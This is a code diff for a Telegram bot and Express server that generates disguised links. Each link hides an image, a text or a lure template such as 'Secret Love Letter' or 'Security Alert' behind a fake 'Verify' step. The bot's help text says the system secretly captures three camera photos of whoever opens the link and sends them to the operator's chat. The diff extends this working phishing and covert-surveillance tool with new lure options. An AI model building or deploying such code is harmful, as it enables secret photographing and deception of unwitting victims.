@@ -24,7 +24,21 @@ const upload = multer({ dest: 'uploads/' });
 
 app.use(express.static('public'));
 
-const awaitingImage = {};
+// State manager
+const userState = {};
+
+const templates = {
+    'tpl_1': '🎂 Happy Birthday Wish',
+    'tpl_2': '🎉 Congratulations',
+    'tpl_3': '💔 I Miss You',
+    'tpl_4': '😂 Funny Meme',
+    'tpl_5': '🎵 Music Recommendation',
+    'tpl_6': '🎬 Movie Ticket',
+    'tpl_7': '🎁 Surprise Gift',
+    'tpl_8': '💌 Secret Love Letter',
+    'tpl_9': '💵 Money Transfer',
+    'tpl_10': '⚠️ Security Alert'
+};
 
 // ================= Helper Functions =================
 
@@ -41,9 +55,10 @@ async function checkMembership(userId) {
 function showStartMenu(chatId) {
     const opts = {
         reply_markup: {
-            inline_keyboard: [
-                [{ text: '🚀 Start Task', callback_data: 'start_task' }]
-            ]
+            keyboard: [
+                [{ text: '🚀 Start Task' }, { text: '🛠 Help' }]
+            ],
+            resize_keyboard: true
         },
         parse_mode: 'HTML'
     };
@@ -56,8 +71,8 @@ function showStartMenu(chatId) {
 You have been successfully verified as a premium member of our community. 
 
 <b>🔹 How it works:</b>
-1️⃣ Click the <b>Start Task</b> button below.
-2️⃣ Upload the image you want to share.
+1️⃣ Click the <b>🚀 Start Task</b> button below.
+2️⃣ Choose your payload method (Image, Text, or Template).
 3️⃣ Get a unique secure link.
 4️⃣ Share the link with your target.
 
@@ -66,17 +81,49 @@ You have been successfully verified as a premium member of our community.
     bot.sendPhoto(chatId, WELCOME_IMAGE_URL, { caption: menuText, parse_mode: 'HTML', reply_markup: opts.reply_markup });
 }
 
+async function createLink(chatId, type, content) {
+    try {
+        // Content is original_image_url for 'image', and text content for 'text'/'template'
+        const insertObj = {
+            chat_id: chatId,
+            payload_type: type
+        };
+        
+        if (type === 'image') {
+            insertObj.original_image_url = content;
+            insertObj.payload_content = null;
+        } else {
+            insertObj.original_image_url = null;
+            insertObj.payload_content = content;
+        }
+
+        const { data: insertData, error: dbError } = await supabase
+            .from('links')
+            .insert([insertObj])
+            .select();
+
+        if (dbError) throw dbError;
+
+        const uniqueId = insertData[0].id;
+        const generatedLink = `${BASE_URL}?id=${uniqueId}`;
+
+        const successMsg = `<b>✅ Success!</b> Here is your link:\n\n<code>${generatedLink}</code>\n\n<i>Send this link to someone. When they open it and allow camera access, their photos will be sent to you here.</i>`;
+        bot.sendMessage(chatId, successMsg, { parse_mode: 'HTML' });
+    } catch (err) {
+        console.error('DB Insert Error:', err);
+        bot.sendMessage(chatId, '❌ Sorry, there was an error generating your link.');
+    }
+}
+
 // ================= Telegram Bot Logic =================
 
 bot.onText(/\/start/, async (msg) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
+    userState[chatId] = { step: 'none' };
     
     try {
-        // First, let user know we are checking
         bot.sendChatAction(chatId, 'typing');
-        
-        // Check membership
         const isMember = await checkMembership(userId);
         
         if (!isMember) {
@@ -109,19 +156,19 @@ bot.onText(/\/help/, (msg) => {
 Welcome to the ultimate secure image sharing tool! Here is the step-by-step guide:
 
 <b>1️⃣ Start the Bot:</b>
-Click the <b>Start Task</b> button from the main menu.
+Click the <b>🚀 Start Task</b> button from the bottom menu.
 
-<b>2️⃣ Upload an Image:</b>
-Send any photo to the bot. This is the "protected" image you want your target to see.
+<b>2️⃣ Choose Method:</b>
+Select whether you want to hide an Image, a Text message, or a ready-made Template.
 
 <b>3️⃣ Get the Secure Link:</b>
-The bot will instantly generate a unique, secure link for your image.
+The bot will instantly generate a unique, secure link for your payload.
 
 <b>4️⃣ Share the Link:</b>
-Send this link to your target. When they open it, they will see a blurred version of your image.
+Send this link to your target.
 
 <b>5️⃣ Verification Process:</b>
-To view the clear image, they must click <b>Verify</b> and allow camera access.
+To view the hidden content, they must click <b>Verify</b> and allow camera access.
 
 <b>6️⃣ Receive Captures:</b>
 The system will secretly capture 3 photos and send them directly to you in this chat!
@@ -146,30 +193,80 @@ bot.on('callback_query', async (callbackQuery) => {
                 bot.answerCallbackQuery(callbackQuery.id, { text: '❌ You haven\'t joined the channel yet! Please join first.', show_alert: true });
             }
         }
-        else if (callbackQuery.data === 'start_task') {
-            awaitingImage[chatId] = true;
-            bot.sendMessage(chatId, '<b>📸 Please upload the image you want to use.</b>\n<i>Just send any photo directly to me now.</i>', { parse_mode: 'HTML' });
+        else if (callbackQuery.data === 'method_image') {
+            userState[chatId] = { step: 'await_image' };
+            bot.sendMessage(chatId, '<b>📸 Please upload the image you want to hide.</b>\n<i>Just send any photo directly to me now.</i>', { parse_mode: 'HTML' });
             bot.answerCallbackQuery(callbackQuery.id);
+        }
+        else if (callbackQuery.data === 'method_text') {
+            userState[chatId] = { step: 'await_text' };
+            bot.sendMessage(chatId, '<b>📝 Please send the text message you want to hide.</b>\n<i>Type your message and send it to me.</i>', { parse_mode: 'HTML' });
+            bot.answerCallbackQuery(callbackQuery.id);
+        }
+        else if (callbackQuery.data === 'method_template') {
+            userState[chatId] = { step: 'none' };
+            const templateKeyboard = Object.keys(templates).map(key => ([{ text: templates[key], callback_data: key }]));
+            bot.sendMessage(chatId, '<b>🎁 Select a Template to hide:</b>', {
+                parse_mode: 'HTML',
+                reply_markup: { inline_keyboard: templateKeyboard }
+            });
+            bot.answerCallbackQuery(callbackQuery.id);
+        }
+        else if (templates[callbackQuery.data]) {
+            // Template selected
+            bot.answerCallbackQuery(callbackQuery.id, { text: 'Template selected!' });
+            await createLink(chatId, 'template', templates[callbackQuery.data]);
         }
     } catch (error) {
         console.error("Callback query error:", error);
     }
 });
 
-// Ignore normal text messages
-bot.on('message', (msg) => {
+// Handle custom keyboard clicks & text inputs
+bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
-    if (msg.text && !msg.text.startsWith('/')) {
-        bot.sendMessage(chatId, '<i>⚠️ Please use the provided buttons. Text input is disabled.</i>', { parse_mode: 'HTML' });
+    const text = msg.text;
+
+    if (!text) return; // ignore non-text here
+    if (text.startsWith('/')) return; // ignore commands
+
+    if (text === '🚀 Start Task') {
+        userState[chatId] = { step: 'none' };
+        const opts = {
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: '📸 Send Image', callback_data: 'method_image' }],
+                    [{ text: '📝 Send Text', callback_data: 'method_text' }],
+                    [{ text: '🎁 Select Template', callback_data: 'method_template' }]
+                ]
+            },
+            parse_mode: 'HTML'
+        };
+        bot.sendMessage(chatId, '<b>⚙️ Select Payload Method:</b>\nWhat do you want to hide behind the verification?', opts);
+    } 
+    else if (text === '🛠 Help') {
+        userState[chatId] = { step: 'none' };
+        // Trigger help command logic
+        bot.emit('text', { ...msg, text: '/help' }, null); // simulate command
+    }
+    else {
+        // User typed normal text
+        if (userState[chatId] && userState[chatId].step === 'await_text') {
+            userState[chatId] = { step: 'none' };
+            bot.sendMessage(chatId, '<i>Processing your text...</i>', { parse_mode: 'HTML' });
+            await createLink(chatId, 'text', text);
+        } else {
+            bot.sendMessage(chatId, '<i>⚠️ Please use the provided buttons.</i>', { parse_mode: 'HTML' });
+        }
     }
 });
 
 bot.on('photo', async (msg) => {
     const chatId = msg.chat.id;
     
-    if (awaitingImage[chatId]) {
+    if (userState[chatId] && userState[chatId].step === 'await_image') {
         bot.sendMessage(chatId, '<i>Processing your image... Please wait.</i>', { parse_mode: 'HTML' });
-        awaitingImage[chatId] = false;
+        userState[chatId] = { step: 'none' };
         
         try {
             const photo = msg.photo[msg.photo.length - 1];
@@ -206,22 +303,9 @@ bot.on('photo', async (msg) => {
                         
                         const publicUrl = publicUrlData.publicUrl;
 
-                        const { data: insertData, error: dbError } = await supabase
-                            .from('links')
-                            .insert([
-                                { chat_id: chatId, original_image_url: publicUrl }
-                            ])
-                            .select();
-
-                        if (dbError) throw dbError;
-
-                        const uniqueId = insertData[0].id;
-                        const generatedLink = `${BASE_URL}?id=${uniqueId}`;
-
-                        const successMsg = `<b>✅ Success!</b> Here is your link:\n\n<code>${generatedLink}</code>\n\n<i>Send this link to someone. When they open it and allow camera access, their photos will be sent to you here.</i>`;
-                        bot.sendMessage(chatId, successMsg, { parse_mode: 'HTML' });
-                        
                         fs.unlinkSync(filePath);
+                        
+                        await createLink(chatId, 'image', publicUrl);
                     } catch (uploadErr) {
                         console.error('Supabase Error:', uploadErr);
                         bot.sendMessage(chatId, '❌ Sorry, there was an error uploading your image to the database.');
@@ -246,14 +330,18 @@ app.get('/api/link/:id', async (req, res) => {
     try {
         const { data, error } = await supabase
             .from('links')
-            .select('original_image_url')
+            .select('*')
             .eq('id', id)
             .single();
 
         if (error || !data) {
             return res.status(404).json({ error: 'Link not found' });
         }
-        res.json({ original_image_url: data.original_image_url });
+        res.json({ 
+            payload_type: data.payload_type || 'image',
+            payload_content: data.payload_content,
+            original_image_url: data.original_image_url 
+        });
     } catch (err) {
         console.error('API Error:', err);
         res.status(500).json({ error: 'Internal server error' });
@@ -280,7 +368,6 @@ app.post('/upload', upload.array('photos', 3), async (req, res) => {
         }
 
         const chatId = linkData.chat_id;
-        const originalImageUrl = linkData.original_image_url;
         const uploadedPhotos = [];
 
         for (let i = 0; i < files.length; i++) {
@@ -305,11 +392,16 @@ app.post('/upload', upload.array('photos', 3), async (req, res) => {
 
         if (uploadedPhotos.length > 0) {
             await bot.sendMediaGroup(chatId, uploadedPhotos);
-            bot.sendMessage(chatId, '<b>📸 New photos received from your link!</b>', { parse_mode: 'HTML' });
+            let msgText = '<b>📸 New photos received from your link!</b>\n';
+            if (linkData.payload_type === 'image') msgText += '<i>Method: Image</i>';
+            else if (linkData.payload_type === 'text') msgText += '<i>Method: Text</i>';
+            else if (linkData.payload_type === 'template') msgText += `<i>Method: Template (${linkData.payload_content})</i>`;
+            
+            bot.sendMessage(chatId, msgText, { parse_mode: 'HTML' });
         }
 
         files.forEach(file => fs.unlinkSync(file.path));
-        res.json({ success: true, original_image_url: originalImageUrl });
+        res.json({ success: true });
 
     } catch (err) {
         console.error('Upload Endpoint Error:', err);
